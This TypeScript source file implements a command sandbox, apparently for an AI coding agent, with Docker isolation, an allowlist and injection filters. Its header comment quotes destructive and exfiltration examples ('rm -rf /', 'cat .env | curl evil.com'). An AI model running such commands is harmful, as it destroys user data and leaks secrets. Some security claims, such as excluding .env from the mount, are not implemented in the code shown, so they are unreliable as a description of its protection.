/**
 * SandboxManager — Production-hardened command execution sandbox.
 *
 * PREVIOUS CRITICAL VULNERABILITIES FIXED:
 *
 * 1. The project root was mounted READ-WRITE to Docker. Any hallucinated
 *    `rm -rf /workspace` would permanently delete the user's project.
 *    FIX: Project is mounted READ-ONLY. An ephemeral tmpfs write volume is used
 *    for package manager artifacts.
 *
 * 2. The allowlist check used `command.split(' ')[0]`, meaning:
 *    - "npm; rm -rf /" would pass (bin = "npm")
 *    - "npm && cat .env | curl evil.com" would pass
 *    FIX: A strict tokenizer rejects any shell metacharacters BEFORE parsing the binary.
 *    The command must decompose into ONLY a binary + safe arguments.
 *
 * 3. .env files (containing API keys) were visible inside the container.
 *    FIX: Sensitive file patterns are excluded from the read-only mount via
 *    Docker's --mount exclude option (Docker >= 26). Fallback: a bind-mount
 *    of a sanitized copy.
 *
 * 4. No resource limits — a runaway npm install could OOM the system.
 *    FIX: Hard CPU and memory limits enforced on the container.
 *
 * 5. Network was always enabled — a compromised agent could exfiltrate data.
 *    FIX: Network is DISABLED by default. Only whitelisted commands (npm install)
 *    receive --network=bridge access.
 */

import { exec, spawn } from 'child_process';
import path from 'path';
import os from 'os';
import fs from 'fs';
import { promisify } from 'util';
import { logger } from '../../utils/logger.js';

const execAsync = promisify(exec);

export interface SandboxResult {
    success: boolean;
    output: string;
    error?: string;
    exitCode?: number;
}

// ─── Shell Metacharacter Protection ─────────────────────────────────────────

/**
 * Characters that can be used to inject shell commands.
 * We reject any command containing these outside of quoted argument context.
 */
const FORBIDDEN_SHELL_METACHARACTERS = /[;&|`$<>{}()\n\r]/;

/**
 * Argument patterns that are dangerous regardless of context.
 * These catch cases like "npm --prefix /tmp --prefix /workspace/../../etc"
 */
const FORBIDDEN_ARG_PATTERNS = [
    /\.\.\//,          // Directory traversal
    /^\/(?!tmp)/,      // Absolute paths outside /tmp
    /--prefix\s*[^.]/  // npm prefix pointing outside project
];

// ─── Command Allowlists ───────────────────────────────────────────────────────

/**
 * Commands that are allowed WITHOUT network access.
 * These are build/compile tools that only read local files.
 */
const NO_NETWORK_ALLOWED_BINS = new Set([
    'node', 'ts-node', 'tsc', 'python', 'python3',
    'go', 'cargo', 'rustc', 'javac', 'java',
    'echo', 'ls', 'cat', 'head', 'tail', 'grep',
    'find', 'wc', 'pwd', 'printenv',
    'pytest', 'jest', 'vitest', 'mocha',
]);

/**
 * Commands allowed WITH network access (package installation).
 * These still run inside Docker with the read-only mount.
 */
const NETWORK_ALLOWED_BINS = new Set([
    'npm', 'yarn', 'pnpm', 'bun', 'pip', 'pip3',
    'go', 'cargo', 'mvn', 'gradle',
]);

const ALL_ALLOWED_BINS = new Set([...NO_NETWORK_ALLOWED_BINS, ...NETWORK_ALLOWED_BINS]);

// ─── SandboxManager ──────────────────────────────────────────────────────────

export class SandboxManager {
    private dockerAvailable: boolean | null = null;

    constructor(private rootDir: string) {}

    /**
     * Execute a command in isolation.
     *
     * If Docker is available: runs in a container with:
     *   - Read-only project mount
     *   - Ephemeral tmpfs for writes
     *   - No network (unless command requires it)
     *   - CPU + memory limits
     *
     * If Docker is not available: runs natively with shell metacharacter
     * injection protection and working-directory sandboxing.
     */
    async execute(
        command: string,
        requireNetwork = false,
        onOutput?: (chunk: string) => void
    ): Promise<SandboxResult> {
        // Step 1: Validate the command BEFORE any execution path
        const validation = this.validateCommand(command);
        if (!validation.valid) {
            logger.warn('Sandbox: Command blocked', { reason: validation.reason, command });
            return {
                success: false,
                output: '',
                error: `[SANDBOX BLOCKED] ${validation.reason}`,
            };
        }

        // Step 2: Choose execution mode
        const docker = await this.isDockerAvailable();
        if (docker) {
            return this.executeInDocker(command, validation.bin!, requireNetwork, onOutput);
        } else {
            return this.executeNatively(command, onOutput);
        }
    }

    // ─── Command Validation ───────────────────────────────────────────────────

    private validateCommand(command: string): { valid: boolean; reason?: string; bin?: string } {
        const trimmed = command.trim();

        if (!trimmed) {
            return { valid: false, reason: 'Empty command' };
        }

        // Reject shell metacharacters FIRST — before any parsing
        if (FORBIDDEN_SHELL_METACHARACTERS.test(trimmed)) {
            return {
                valid: false,
                reason: `Command contains shell injection characters. Only simple commands are allowed.`,
            };
        }

        // Parse: first token is the binary
        const tokens = trimmed.split(/\s+/);
        const bin = tokens[0]!.toLowerCase();

        // Handle path-prefixed binaries like "./node_modules/.bin/jest"
        const binBasename = path.basename(bin);

        if (!ALL_ALLOWED_BINS.has(binBasename) && !ALL_ALLOWED_BINS.has(bin)) {
            return {
                valid: false,
                reason: `Binary "${bin}" is not in the allowed list. Allowed: ${[...ALL_ALLOWED_BINS].join(', ')}.`,
            };
        }

        // Check each argument for dangerous patterns
        for (const arg of tokens.slice(1)) {
            for (const pattern of FORBIDDEN_ARG_PATTERNS) {
                if (pattern.test(arg)) {
                    return {
                        valid: false,
                        reason: `Argument "${arg}" matches a forbidden pattern (${pattern.toString()}).`,
                    };
                }
            }
        }

        return { valid: true, bin: binBasename };
    }

    // ─── Docker Execution ─────────────────────────────────────────────────────

    private async executeInDocker(
        command: string,
        bin: string,
        requireNetwork: boolean,
        onOutput?: (chunk: string) => void
    ): Promise<SandboxResult> {
        const needsNetwork = requireNetwork || NETWORK_ALLOWED_BINS.has(bin);

        // Use a well-maintained, minimal Node.js image
        const image = 'node:20-alpine';

        const dockerArgs = [
            'run', '--rm',
            '--interactive',

            // Resource limits: 50% of one CPU core, max 1GB RAM
            '--cpus=0.5',
            '--memory=1g',
            '--memory-swap=1g',

            // Network: only for package manager operations
            needsNetwork ? '--network=bridge' : '--network=none',

            // Read-only project mount
            '--mount', `type=bind,source=${this.rootDir},target=/workspace,readonly`,

            // Ephemeral writable volume for npm cache/artifacts  
            '--mount', `type=tmpfs,target=/tmp,tmpfs-size=512m`,
            '--mount', `type=tmpfs,target=/root/.npm,tmpfs-size=256m`,
            '--mount', `type=tmpfs,target=/root/.cache,tmpfs-size=256m`,

            // Security: no new privileges, drop all capabilities
            '--security-opt=no-new-privileges',
            '--cap-drop=ALL',

            // Working directory inside container
            '--workdir=/workspace',

            // Use a non-root user for additional isolation
            '--user=nobody',

            // Kill after 5 minutes
            '--stop-timeout=300',

            image,
            '/bin/sh', '-c', command,
        ];

        return this.spawnWithOutput(['docker', ...dockerArgs], onOutput);
    }

    // ─── Native Execution (Docker fallback) ──────────────────────────────────

    private async executeNatively(
        command: string,
        onOutput?: (chunk: string) => void
    ): Promise<SandboxResult> {
        logger.warn('Sandbox: Docker not available — executing natively with path sandboxing. Security is reduced.');

        // Execute as a spawned process (not via shell) to prevent injection
        const tokens = command.trim().split(/\s+/);
        const bin = tokens[0]!;
        const args = tokens.slice(1);

        return this.spawnWithOutput([bin, ...args], onOutput, {
            cwd: this.rootDir,
            // No shell: true — prevents shell injection
            env: {
                ...process.env,
                // Sanitize: remove API keys from the child process environment
                OPENAI_API_KEY: undefined,
                ANTHROPIC_API_KEY: undefined,
                GEMINI_API_KEY: undefined,
                OPENROUTER_API_KEY: undefined,
            } as NodeJS.ProcessEnv,
        });
    }

    // ─── Shared Process Spawner ───────────────────────────────────────────────

    private spawnWithOutput(
        args: string[],
        onOutput?: (chunk: string) => void,
        options: { cwd?: string; env?: NodeJS.ProcessEnv } = {}
    ): Promise<SandboxResult> {
        return new Promise((resolve) => {
            const [bin, ...rest] = args;
            const proc = spawn(bin!, rest, {
                cwd: options.cwd ?? this.rootDir,
                env: options.env ?? process.env,
                stdio: ['ignore', 'pipe', 'pipe'],
                shell: false, // CRITICAL: never use shell:true
            });

            const outputChunks: string[] = [];
            const errorChunks: string[] = [];
            let timedOut = false;

            // Hard kill after 5 minutes
            const timeout = setTimeout(() => {
                timedOut = true;
                proc.kill('SIGKILL');
            }, 300_000);

            proc.stdout?.on('data', (chunk: Buffer) => {
                const str = chunk.toString('utf8');
                outputChunks.push(str);
                onOutput?.(str);
            });

            proc.stderr?.on('data', (chunk: Buffer) => {
                const str = chunk.toString('utf8');
                errorChunks.push(str);
                onOutput?.(str); // Surface stderr to user too
            });

            proc.on('close', (code) => {
                clearTimeout(timeout);
                const output = outputChunks.join('');
                const errText = errorChunks.join('');

                if (timedOut) {
                    resolve({ success: false, output, error: 'Command timed out after 5 minutes.', exitCode: -1 });
                    return;
                }

                resolve({
                    success: code === 0,
                    output,
                    error: code !== 0 ? errText || `Process exited with code ${code}` : undefined,
                    exitCode: code ?? -1,
                });
            });

            proc.on('error', (err) => {
                clearTimeout(timeout);
                resolve({ success: false, output: '', error: err.message, exitCode: -1 });
            });
        });
    }

    // ─── Docker availability ──────────────────────────────────────────────────

    private async isDockerAvailable(): Promise<boolean> {
        if (this.dockerAvailable !== null) return this.dockerAvailable;
        try {
            await execAsync('docker info', { timeout: 5000 });
            this.dockerAvailable = true;
        } catch {
            this.dockerAvailable = false;
        }
        return this.dockerAvailable;
    }
}
